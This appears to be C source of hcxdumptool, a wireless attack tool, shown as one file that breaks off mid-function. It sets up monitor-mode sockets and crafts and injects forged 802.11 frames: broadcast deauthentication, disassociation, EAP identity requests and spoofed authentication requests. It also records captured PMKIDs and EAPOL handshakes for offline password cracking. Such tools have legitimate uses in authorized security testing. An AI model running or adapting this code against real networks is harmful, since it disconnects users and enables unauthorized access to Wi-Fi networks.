#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#ifdef __ANDROID__
#include <libgen.h>
#define strdupa strdup
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif
#include <net/if.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>  
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <pthread.h>

#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#endif

#include "include/version.h"
#include "include/wireless-lite.h"
#include "include/hcxdumptool.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"
/*===========================================================================*/
/* global var */

static int fd_socket;
static int fd_pcapng;
static int fd_ippcapng;
static int fd_weppcapng;
static int fd_rcascanpcapng;

static maclist_t *filterlist;
static int filterlist_len;

static struct ifreq ifr_old;
static struct iwreq iwr_old;

aplist_t *aplist, *aplist_ptr;
int aplistcount;

myaplist_t *myaplist, *myaplist_ptr;
macmaclist_t *pownedlist;

static enhanced_packet_block_t *epbhdr;

static uint8_t *packet_ptr;
static int packet_len;
static uint8_t *ieee82011_ptr;
static int ieee82011_len;
static mac_t *macfrx;

static uint8_t *payload_ptr;
static int payload_len;

static uint8_t *llc_ptr;
static llc_t *llc;

static uint8_t *mpdu_ptr;
static mpdu_t *mpdu;

static uint8_t statusout;

static int errorcount;
static int maxerrorcount;

static unsigned long long int incommingcount;
static unsigned long long int outgoingcount;
static unsigned long long int droppedcount;
static unsigned long long int pownedcount;

static bool wantstopflag;
static bool poweroffflag;
static bool channelchangedflag;
static bool activescanflag;
static bool rcascanflag;
static bool deauthenticationflag;
static bool disassociationflag;
static bool attackapflag;
static bool attackclientflag;

static int filtermode;
static int eapoltimeout;
static int deauthenticationintervall;
static int deauthenticationsmax;
static int apattacksintervall;
static int apattacksmax;
static int staytime;
static int stachipset;
static uint8_t cpa;

static uint32_t myouiap;
static uint32_t mynicap;
static uint32_t myouista;
static uint32_t mynicsta;

static uint64_t timestamp;
static uint64_t timestampstart;

struct timeval tv;
static uint64_t mytime;

static int mydisassociationsequence;
static int myidrequestsequence;
static int mydeauthenticationsequence;
static int mybeaconsequence;
static int myproberequestsequence;
static int myauthenticationrequestsequence;
static int myauthenticationresponsesequence;
static int myassociationrequestsequence;
static int myassociationresponsesequence;
static int myproberesponsesequence;

static char *interfacename;
static char *pcapngoutname;
static char *ippcapngoutname;
static char *weppcapngoutname ;
static char *filterlistname;
static char *rcascanlistname;
static char *rcascanpcapngname;


static const uint8_t hdradiotap[] =
{
/* now we are running hardware handshake */
0x00, 0x00,
0x08, 0x00,
0x00, 0x00,
0x00, 0x00
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t channeldefaultlist[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64,
100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 147, 149, 151, 153, 155, 157,
161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216,
0
};

static uint8_t channelscanlist[128] =
{
1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};


static uint8_t mac_orig[6];
static uint8_t mac_mysta[6];
static uint8_t mac_myap[6];
static uint8_t mac_mybcap[6];

static unsigned long long int rcrandom;
static uint8_t anoncerandom[32];

uint64_t lasttimestampm1;
uint8_t laststam1[6];
uint8_t lastapm1[6];
uint64_t lastrcm1;

uint64_t lasttimestampm2;
uint8_t laststam2[6];
uint8_t lastapm2[6];
uint64_t lastrcm2;

uint64_t lasttimestampm2al;
uint8_t laststam2al[6];
uint8_t lastapm2al[6];
uint64_t lastrcm2al;

uint8_t assocmacap[6];
uint8_t assocmacsta[6];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
/*===========================================================================*/
static inline void debugprint(int len, uint8_t *ptr)
{
static int p;

for(p = 0; p < len; p++)
	{
	printf("%02x", ptr[p]);
	}
printf("\n");
return;
}
/*===========================================================================*/
static inline void debugprint2(int len, uint8_t *ptr, int len2, uint8_t *ptr2)
{
static int p;

for(p = 0; p < len; p++)
	{
	printf("%02x", ptr[p]);
	}
printf(" ");

for(p = 0; p < len2; p++)
	{
	printf("%02x", ptr2[p]);
	}
printf("\n");


return;
}
/*===========================================================================*/
static inline void checkunwanted(char *unwantedname)
{
FILE *fp;
char pidline[1024];
char *pidptr = NULL;

memset(&pidline, 0, 1024);
fp = popen(unwantedname,"r");
if(fp)
	{
	pidptr = fgets(pidline, 1024, fp);
	if(pidptr != NULL)
		{
		printf("warning: %s is running with pid %s", &unwantedname[6], pidline);
		}
	pclose(fp);
	}
return;
}
/*===========================================================================*/
static inline void checkallunwanted()
{
char *networkmanager = "pidof NetworkManager";
char *wpasupplicant = "pidof wpa_supplicant";

checkunwanted(networkmanager);
checkunwanted(wpasupplicant);
return;
}
/*===========================================================================*/
static inline void saveapinfo()
{
static int c, p;
aplist_t *zeiger;
FILE *fhrsl;

if((fhrsl = fopen(rcascanlistname, "w+")) == NULL)
	{
	fprintf(stderr, "error opening file %s", rcascanlistname);
	return;
	}
qsort(aplist, aplist_ptr -aplist, APLIST_SIZE, sort_aplist_by_essid);
zeiger = aplist;
for(c = 0; APLIST_MAX; c++)
	{
	if(zeiger->timestamp == 0)
		{
		break;
		}
	for(p = 0; p< 6; p++)
		{
		fprintf(fhrsl, "%02x", zeiger->addr[p]);
		}
	if(isasciistring(zeiger->essid_len, zeiger->essid) != false)
		{
		fprintf(fhrsl, " %.*s", zeiger->essid_len, zeiger->essid);
		}
	else
		{
		fprintf(stdout, " $HEX[");
		for(p = 0; p < zeiger->essid_len; p++)
			{
			fprintf(fhrsl, "%02x", zeiger->essid[p]);
			}
		fprintf(stdout, "]");
		}
	if(zeiger->status == 1)
		{
		fprintf(fhrsl, " [CHANNEL %d, AP IN RANGE]\n", zeiger->channel);
		}
	else
		{
		fprintf(fhrsl, " [CHANNEL %d]\n", zeiger->channel);
		}
	zeiger++;
	}
fclose(fhrsl);
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
static struct ifreq ifr;

memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ -1);
ioctl(fd_socket, SIOCSIFFLAGS, &ifr);
ioctl(fd_socket, SIOCSIWMODE, &iwr_old);
ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old);

if(fd_socket > 0)
	{
	if(close(fd_socket) != 0)
		{
		perror("failed to close rx socket");
		}
	}
if(fd_weppcapng > 0)
	{
	writeisb(fd_weppcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_weppcapng) != 0)
		{
		perror("failed to sync wep pcapng file");
		}
	if(close(fd_weppcapng) != 0)
		{
		perror("failed to close wep pcapng file");
		}
	}
if(fd_ippcapng > 0)
	{
	writeisb(fd_ippcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_ippcapng) != 0)
		{
		perror("failed to sync ip pcapng file");
		}
	if(close(fd_ippcapng) != 0)
		{
		perror("failed to close ip pcapng file");
		}
	}
if(fd_pcapng > 0)
	{
	writeisb(fd_pcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_pcapng) != 0)
		{
		perror("failed to sync pcapng file");
		}
	if(close(fd_pcapng) != 0)
		{
		perror("failed to close pcapng file");
		}
	}

if(filterlist != NULL)
	{
	free(filterlist);
	}

if(aplist != NULL)
	{
	free(aplist);
	}

if(myaplist != NULL)
	{
	free(myaplist);
	}

if(pownedlist != NULL)
	{
	free(pownedlist);
	}

if(rcascanflag == true)
	{
	if(fd_rcascanpcapng > 0)
		{
		writeisb(fd_rcascanpcapng, 0, timestampstart, incommingcount);
		if(fsync(fd_rcascanpcapng) != 0)
			{
			perror("failed to sync pcapng file");
			}
		if(close(fd_rcascanpcapng) != 0)
			{
			perror("failed to close pcapng file");
			}
		}
	if(rcascanlistname != NULL)
		{
		saveapinfo();
		}
	}

printf("\nterminated...\e[?25h\n");
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		printf("can't power off\n");
	}
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
static inline void printapinfo()
{
static int c, p;
aplist_t *zeiger;
struct timeval tvfd;
static char timestring[16];

zeiger = aplist;
qsort(aplist, aplistcount, APLIST_SIZE, sort_aplist_by_essid);
printf("\e[1;1H\e[2J");
for(c = 0; c < aplistcount; c++)
	{
	if(zeiger->timestamp == 0)
		{
		break;
		}
	tvfd.tv_sec = zeiger->timestamp /1000000;
	tvfd.tv_usec = 0;
	strftime(timestring, 16, "%H:%M:%S", localtime(&tvfd.tv_sec));
	fprintf(stdout, "[%s] ", timestring);
	for(p = 0; p< 6; p++)
		{
		fprintf(stdout, "%02x", zeiger->addr[p]);
		}
	if((zeiger->essid_len == 0) || (zeiger->essid[0] == 0))
		{
		fprintf(stdout, " <hidden ssid>");
		}
	else
		{
		if(isasciistring(zeiger->essid_len, zeiger->essid) == true)
			{
			fprintf(stdout, " %.*s", zeiger->essid_len, zeiger->essid);
			}
		else
			{
			fprintf(stdout, " $HEX[");
			for(p = 0; p < zeiger->essid_len; p++)
				{
				fprintf(stdout, "%02x", zeiger->essid[p]);
				}
			fprintf(stdout, "]");
			}
		}
	if(zeiger->status == 1)
		{
		fprintf(stdout, " [CHANNEL %d, AP IN RANGE]\n", zeiger->channel);
		}
	else
		{
		fprintf(stdout, " [CHANNEL %d]\n", zeiger->channel);
		}
	zeiger++;
	}
fprintf(stdout, "INFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, err=%d %d\n"
	"-----------------------------------------------------------------------------------\n"
	, channelscanlist[cpa], incommingcount, droppedcount, outgoingcount, errorcount, aplistcount);
return;
}
/*===========================================================================*/
static inline void printtimenet(uint8_t *mac_to, uint8_t *mac_from)
{
static int p;
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));

fprintf(stdout, "\33[2K\r[%s - %03d] ", timestring, channelscanlist[cpa]);

for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", mac_from[p]);
	}
fprintf(stdout, " -> ");
for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", mac_to[p]);
	}
return;
}
/*===========================================================================*/
static inline void printessid(int essidlen, uint8_t *essid)
{
static int p;

if(essidlen == 0)
	{
	fprintf(stdout, " <hidden ssid>");
	return;
	}
if(isasciistring(essidlen, essid) != false)
	{
	fprintf(stdout, " %.*s", essidlen, essid);
	}
else
	{
	fprintf(stdout, " $HEX[");
	for(p = 0; p < essidlen; p++)
		{
		fprintf(stdout, "%02x", essid[p]);
		}
	fprintf(stdout, "]");
	}
return;
}
/*===========================================================================*/
static inline void printid(uint16_t idlen, uint8_t *id)
{
static int p;

if(id[0] == 0)
	{
	return;
	}
if(isasciistring(idlen, id) != false)
	{
	fprintf(stdout, " %.*s", idlen, id);
	}
else
	{
	fprintf(stdout, " $HEX[");
	for(p = 0; p < idlen; p++)
		{
		fprintf(stdout, "%02x", id[p]);
		}
	fprintf(stdout, "]");
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void writeepbm2(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

static char aplesscomment[] = {"HANDSHAKE AP-LESS" };
#define APLESSCOMMENT_SIZE sizeof(aplesscomment)

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packet_len;
epbhdr->org_len = packet_len;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp;
padding = 0;
if((epbhdr->cap_len % 4))
	{
	 padding = 4 -(epbhdr->cap_len % 4);
	}
epblen += packet_len;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_COMMENT, APLESSCOMMENT_SIZE, aplesscomment);
epblen += addoption(epb +epblen, 62109, 32, (char*)anoncerandom);
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;

written = write(fd, &epb, epblen);
if(written != epblen)
	{
	errorcount++;
	}
return;	
}
/*===========================================================================*/
static void writeepb(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packet_len;
epbhdr->org_len = packet_len;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp;
padding = 0;
if((epbhdr->cap_len % 4))
	{
	 padding = 4 -(epbhdr->cap_len % 4);
	}
epblen += packet_len;
memset(&epb[epblen], 0, padding);
epblen += padding;
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;

written = write(fd, &epb, epblen);
if(written != epblen)
	{
	errorcount++;
	}
return;	
}
/*===========================================================================*/
/*===========================================================================*/
static inline uint8_t *gettag(uint8_t tag, uint8_t *tagptr, int restlen)
{
static ietag_t *tagfield;

while(0 < restlen)
	{
	tagfield = (ietag_t*)tagptr;
	if(tagfield->id == tag)
		{
		if(restlen >= (int)tagfield->len +(int)IETAG_SIZE)
			{
			return tagptr;
			}
		else
			{
			return NULL;
			}
		}
	tagptr += tagfield->len +IETAG_SIZE;
	restlen -= tagfield->len +IETAG_SIZE;
	}
return NULL;
}
/*===========================================================================*/
static inline bool checkfilterlistentry(uint8_t *filtermac)
{
static int c;
static maclist_t * zeiger;


zeiger = filterlist;
for(c = 0; c < filterlist_len; c++)
	{
	if(memcmp(zeiger->addr, filtermac, 6) == 0)
		{
		return true;
		}
	zeiger++;
	}

return false;
}
/*===========================================================================*/
static inline int checkpownedap(uint8_t *macap)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX; c++)
	{
	if(zeiger->timestamp == 0)
		{
		return 0;
		}
	if(memcmp(zeiger->addr2, macap, 6) == 0)
		{
		return zeiger->status;
		}
	zeiger++;
	}
return 0;
}
/*===========================================================================*/
static inline int checkpownedstaap(uint8_t *pownedmacsta, uint8_t *pownedmacap)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX; c++)
	{
	if(zeiger->timestamp == 0)
		{
		return 0;
		}
	if((memcmp(zeiger->addr1, pownedmacsta, 6) == 0) && (memcmp(zeiger->addr2, pownedmacap, 6) == 0))
		{
		return zeiger->status;
		}
	zeiger++;
	}
return 0;
}
/*===========================================================================*/
static inline int addpownedstaap(uint8_t *pownedmacsta, uint8_t *pownedmacap, uint8_t status)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX -1; c++)
	{
	if(zeiger->timestamp == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr1, pownedmacsta, 6) == 0) && (memcmp(zeiger->addr2, pownedmacap, 6) == 0))
		{
		if((zeiger->status & status) == status)
			{
			return zeiger->status;
			}
		zeiger->status |= status;
		if(status > RX_M1)
			{
			pownedcount++;
			}
		return 0;
		}
	zeiger++;
	}
zeiger->timestamp = timestamp;
zeiger->status = status;
memcpy(zeiger->addr1, pownedmacsta, 6);
memcpy(zeiger->addr2, pownedmacap, 6);
if(status > RX_M1)
	{
	pownedcount++;
	}
qsort(pownedlist, c +1, MACMACLIST_SIZE, sort_macmaclist_by_time);
return 0;
}
/*===========================================================================*/
static void send_requestidentity(uint8_t *macsta, uint8_t *macap)
{
static mac_t *macftx;
const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x01, 0x00, 0x00, 0x0a, 0x01, 0x63, 0x00, 0x0a, 0x01, 0x68, 0x65, 0x6c, 0x6c, 0x6f
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->from_ds = 1;
macftx->duration = 0x002c;
macftx->sequence = myidrequestsequence++ << 4;
if(myidrequestsequence >= 4096)
	{
	myidrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_disassociation(uint8_t *macsta,  uint8_t *macap, uint8_t reason)
{
uint8_t retstatus;
static mac_t *macftx;

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macap) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macap) == false))
	{
	return;
	}
retstatus = checkpownedstaap(macsta, macap);
if((retstatus &RX_PMKID) == RX_PMKID)
	{
	return;
	}
if((retstatus &RX_M23) == RX_M23)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydisassociationsequence++ << 4;
if(mydisassociationsequence >= 4096)
	{
	mydisassociationsequence = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_NORM +2, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_broadcast_deauthentication(uint8_t *macap, uint8_t reason)
{
uint8_t retstatus;
static mac_t *macftx;

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macap) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macap) == false))
	{
	return;
	}
retstatus = checkpownedap(macap);
if((retstatus &RX_PMKID) == RX_PMKID)
	{
	return;
	}
if((retstatus &RX_M23) == RX_M23)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096)
	{
	mydeauthenticationsequence = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_NORM +2, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authenticationresponseopensystem(uint8_t *macsta, uint8_t *macap)
{
static mac_t *macftx;

const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}
if(checkpownedstaap(macsta, macap) > RX_PMKID)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myauthenticationrequestsequence++ << 4;
if(myauthenticationrequestsequence >= 4096)
	{
	myauthenticationrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authenticationrequestopensystem(uint8_t *mac_ap)
{
int cssize;
static mac_t *macftx;

const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

const uint8_t csbroadcom[] =
{
0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x02, 0xf0, 0x05, 0x00, 0x00
};
#define CSBROADCOM_SIZE sizeof(csbroadcom)

const uint8_t csapplebroadcom[] =
{
0xdd, 0x0b, 0x00, 0x17, 0xf2, 0x0a, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00,
0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00
};
#define CSAPPLEBROADCOM_SIZE sizeof(csapplebroadcom)

const uint8_t cssonos[] =
{
0xdd, 0x06, 0x00, 0x0e, 0x58, 0x02, 0x01, 0x01
};
#define CSSONOS_SIZE sizeof(cssonos)

const uint8_t csnetgearbroadcom[] =
{
0xdd, 0x06, 0x00, 0x14, 0x6c, 0x00, 0x00, 0x00,
0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x04, 0x00, 0x1c, 0x00, 0x00
};
#define CSNETGEARBROADCOM_SIZE sizeof(csnetgearbroadcom)

const uint8_t cswilibox[] =
{
0xdd, 0x0f, 0x00, 0x19, 0x3b, 0x02, 0x04, 0x08, 0x00, 0x00, 0x00, 0x03, 0x04, 0x01, 0x00, 0x00,
0x00
};
#define CSWILIBOX_SIZE sizeof(cswilibox)

const uint8_t cscisco[] =
{
0xdd, 0x1d, 0x00, 0x40, 0x96, 0x0c, 0x01, 0xb2, 0xb1, 0x74, 0xea, 0x45, 0xc5, 0x65, 0x01, 0x00,
0x00, 0xb9, 0x16, 0x00, 0x00, 0x00, 0x00, 0x1a, 0xc1, 0xdb, 0xf1, 0xf5, 0x05, 0xec, 0xed
};
#define CSCISCO_SIZE sizeof(cscisco)


uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(mac_ap) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(mac_ap) == false))
	{
	return;
	}

if(checkpownedstaap(mac_mysta, mac_ap) > 0)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, mac_ap, 6);
memcpy(macftx->addr2, &mac_mysta, 6);
memcpy(macftx->addr3, mac_ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myauthenticationrequestsequence++ << 4;
if(myauthenticationrequestsequence >= 4096)
	{
	myauthenticationrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);

if(stachipset == CS_BROADCOM)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &csbroadcom, CSBROADCOM_SIZE);
	cssize = CSBROADCOM_SIZE;
	}
else if(stachipset == CS_APPLE_BROADCOM)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &csapplebroadcom, CSAPPLEBROADCOM_SIZE);
	cssize = CSAPPLEBROADCOM_SIZE;
	}
else if(stachipset == CS_SONOS)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &cssonos, CSSONOS_SIZE);
	cssize = CSSONOS_SIZE;
	}
else if(stachipset == CS_NETGEARBROADCOM)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &csnetgearbroadcom, CSNETGEARBROADCOM_SIZE);
	cssize = CSNETGEARBROADCOM_SIZE;
	}
else if(stachipset == CS_WILIBOX)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &cswilibox, CSWILIBOX_SIZE);
	cssize = CSWILIBOX_SIZE;
	}
else if(stachipset == CS_CISCO)
	{
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE], &cscisco, CSCISCO_SIZE);
	cssize = CSCISCO_SIZE;
	}
else
	{
	cssize = 0;
	}

if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +cssize, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_directed_proberequest(uint8_t *macap, int essid_len, uint8_t *essid)
{
static mac_t *macftx;
static uint8_t *beaconptr;
static int beaconlen;
static uint8_t *essidtagptr;
static ietag_t *essidtag;

const uint8_t directedproberequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macap) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macap) == false))
	{
	return;
	}
if(checkpownedstaap(mac_mysta, macap) != 0)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_mysta, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myproberequestsequence++ << 4;
if(myproberequestsequence >= 4096)
	{
	myproberequestsequence= 0;
	}

beaconptr = payload_ptr +CAPABILITIESAP_SIZE;
beaconlen = payload_len -CAPABILITIESAP_SIZE;

essidtagptr = gettag(TAG_SSID, beaconptr, beaconlen);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +1] = essid_len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE], essid, essid_len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
